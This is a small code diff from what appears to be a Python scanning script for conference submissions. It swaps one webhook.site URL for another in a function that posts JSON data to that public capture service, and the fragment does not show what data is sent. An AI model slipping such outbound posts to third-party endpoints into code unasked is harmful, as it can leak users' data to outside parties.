@@ -60,7 +60,7 @@ def catscan(conference_id, contribution_id, revision_id):
 
 
 def send_data(data):
-    requests.post("https://webhook.site/81f414dd-5988-4cb9-8b17-548809b54c9c", json=data)
+    requests.post("https://webhook.site/54076fc4-d71f-42ad-93c6-c044366787df", json=data)
 
 
 def run_scan(event):
